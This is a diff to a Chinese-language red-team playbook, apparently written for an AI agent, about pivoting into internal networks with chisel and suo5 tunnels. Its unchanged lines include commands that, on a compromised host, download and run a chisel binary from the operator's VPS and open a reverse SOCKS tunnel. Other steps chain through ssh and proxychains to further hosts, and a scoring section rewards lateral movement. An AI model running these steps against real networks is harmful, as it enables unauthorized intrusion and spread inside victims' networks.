@@ -26,7 +26,7 @@ enabled: true
 | 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
 | 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |
 
-**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。
+**选择口径**：有 WebShell -> 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 -> 用 chisel。
 
 ## 本机二进制
 
@@ -55,7 +55,7 @@ curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
 # 3) 本机通过 VPS 的 SOCKS 访问内网
 proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
 #    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080
-#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
+#    不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
 ```
 
 ## 二、反向端口转发（把内网某个端口映射出来）
@@ -80,7 +80,7 @@ chisel client <target>:9443 1080:socks
 ## 四、多级 / 联动
 
 ```bash
-# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
+# 已有 A 隧道（suo5 -> 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
 proxychains4 -f runs/proxychains-1080.conf \
   ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
 # 逐层扩大可达范围，每层都要登记隧道与可达网段
@@ -100,16 +100,16 @@ proxychains4 -f runs/proxychains-1080.conf \
 1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：
    - `kind`：`chisel`；
    - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；
-   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
+   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 -> VPS:9443`）；
    - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
    - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
      `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
-     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
+     只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
    - `command`：完整命令原文（服务端 + 客户端两段都要）。
 2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
    通了才算隧道成立；然后 `redteam_session_check` 回写状态。
-3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
-   通过它横向到其它主机 → `server-host`。
+3. **得分**：隧道可达内网 -> `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
+   通过它横向到其它主机 -> `server-host`。
 4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
    写清监听地址与端口，并说明该隧道跨越了靶标边界。
 5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。
